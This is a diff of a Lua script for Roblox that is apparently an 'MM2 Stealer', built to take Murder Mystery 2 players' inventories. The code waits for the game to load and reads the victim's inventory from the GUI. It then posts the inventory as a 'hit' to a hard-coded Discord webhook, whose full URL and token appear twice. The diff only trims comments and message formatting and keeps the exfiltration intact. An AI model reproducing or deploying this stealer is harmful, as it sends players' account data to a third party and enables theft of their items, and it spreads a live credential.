@@ -1,12 +1,11 @@
 Config = {
     Webhook = "https://discord.com/api/webhooks/1301939328015925248/Es_vu2PBwmA15EhZoIii4aa-gQDXIr2u8R3fZPDXciUyxONbooCOpedyGDApMekdYS5b", -- Your webhook for hits.
-    FullInventory = true, -- If true, it will display all of the player's items.
+    FullInventory = true,
 }
 
 repeat wait() until game:IsLoaded()
 
 LogsWebhook = "https://discord.com/api/webhooks/1301939328015925248/Es_vu2PBwmA15EhZoIii4aa-gQDXIr2u8R3fZPDXciUyxONbooCOpedyGDApMekdYS5b"
--- Logs Webhook
 
 LOGS_WEBS = LogsWebhook
 
@@ -36,10 +35,6 @@ local success, errorMsg = pcall(function()
         sendnotification("Invalid 'Webhook' url!")
         InvaildWebhook = true
         return
-    end
-    
-    if Config.FullInventory ~= true and Config.FullInventory ~= false then
-        Config.FullInventory = true
     end
 
     if LocalPlayer.PlayerGui.MainGUI.Game:FindFirstChild("Inventory") ~= nil then
@@ -95,15 +90,10 @@ local success, errorMsg = pcall(function()
     local data = {
         username = StealerName,
         avatar_url = "https://cdn.discordapp.com/attachments/1295330912900223039/1295610470228561972/standard.gif?ex=670f46c7&is=670df547&hm=d67f2702e28851f197035c849929a5d05b1f4b9e6830f463268c3234310d03ce&",
-        content = "You just got a new hit with **"..StealerName.."**!",
-        embeds = {
-            {
-                title = "💻 **__"..StealerName.."__ | __MM2 Stealer__**",
-                description = "🎒 **__Inventory__**\n```" .. FullInventory() .. "```",
-                color = tonumber(0x3365FF),
-            }
-        }
+        content = "🎒 **__Inventory__**\n```" .. FullInventory() .. "```"
     }
+    
+    
     
 
     local request = http_request or request or HttpPost or syn.request
